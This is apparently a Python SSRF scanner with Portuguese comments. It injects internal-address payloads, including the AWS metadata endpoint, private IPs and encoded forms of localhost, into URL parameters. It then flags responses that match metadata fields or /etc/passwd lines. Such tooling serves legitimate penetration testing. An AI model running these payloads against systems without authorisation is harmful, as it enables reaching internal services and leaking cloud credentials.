"""
Scanner SSRF — Vlad Volkov
Detecta vulnerabilidades de Server-Side Request Forgery.
"""

import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Optional

from rich.console import Console
from rich.table import Table
from rich import box

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    pass

console = Console()

# Alvos internos para testar SSRF
ALVOS_SSRF = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://169.254.169.254/",           # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://[::1]/",                      # IPv6 localhost
    "http://0177.0.0.1/",                # Octal
    "http://0x7f000001/",                # Hex
    "http://2130706433/",                # Decimal
]

# Keywords de parâmetros provavelmente vulneráveis a SSRF
PARAMS_SSRF = [
    "url", "uri", "link", "src", "source", "dest", "destination",
    "redirect", "callback", "webhook", "endpoint", "fetch", "request",
    "proxy", "forward", "host", "target", "site", "path", "file",
]

# Indicadores de SSRF
INDICADORES_SSRF = [
    r"AMI\s+ID",                          # AWS metadata
    r"instance-id",
    r"local-ipv4",
    r"public-keys",
    r"<title>.*nginx.*</title>",          # Nginx interno
    r"<title>.*apache.*</title>",         # Apache interno
    r"root:.*:0:0:",                      # /etc/passwd via SSRF
    r"Microsoft-IIS",
]


class ScannerSSRF:
    """Detecta vulnerabilidades de Server-Side Request Forgery."""

    def __init__(self, timeout: int = 8, verificar_ssl: bool = False):
        self.timeout = timeout
        self.verificar_ssl = verificar_ssl
        self.sessao = requests.Session()
        self.sessao.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.vulnerabilidades = []

    def _requisicao(self, url: str) -> Optional[object]:
        try:
            return self.sessao.get(url, timeout=self.timeout, verify=self.verificar_ssl,
                                   allow_redirects=False)
        except Exception:
            return None

    def _params_vulneraveis(self, url: str) -> List[str]:
        """Identifica parâmetros provavelmente vulneráveis a SSRF."""
        parsed = urlparse(url)
        todos_params = list(parse_qs(parsed.query).keys())
        return [p for p in todos_params if any(k in p.lower() for k in PARAMS_SSRF)] or todos_params

    def _url_com_param(self, url: str, param: str, valor: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [valor]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    def _detectar_ssrf(self, resposta) -> Optional[str]:
        if resposta is None:
            return None
        corpo = resposta.text
        for indicador in INDICADORES_SSRF:
            if re.search(indicador, corpo, re.IGNORECASE):
                return indicador
        # Verificar redirect para interno
        location = resposta.headers.get("location", "")
        if "127.0.0.1" in location or "localhost" in location:
            return f"Redirect para: {location}"
        return None

    def escanear(self, url: str, verboso: bool = True) -> List[dict]:
        """Executa scan SSRF."""
        self.vulnerabilidades = []

        params = self._params_vulneraveis(url)
        if not params:
            return []

        if verboso:
            console.print(f"  [cyan]→[/cyan] Testando SSRF em: {url[:60]}")

        for param in params[:3]:  # Limitar a 3 parâmetros
            for alvo in ALVOS_SSRF[:5]:  # Limitar alvos internos
                url_teste = self._url_com_param(url, param, alvo)
                resp = self._requisicao(url_teste)
                indicador = self._detectar_ssrf(resp)

                if indicador:
                    self.vulnerabilidades.append({
                        "tipo": "SSRF",
                        "parametro": f"{param} (GET)",
                        "payload": alvo,
                        "indicador": indicador,
                        "url": url_teste,
                        "severidade": "critico",
                    })
                    break

                time.sleep(0.1)

        if verboso:
            if self.vulnerabilidades:
                console.print(
                    f"  [bold red]✓ SSRF encontrado![/bold red] "
                    f"{len(self.vulnerabilidades)} vulnerabilidade(s)"
                )
            else:
                console.print("  [dim]✗ Nenhum SSRF detectado[/dim]")

        return self.vulnerabilidades
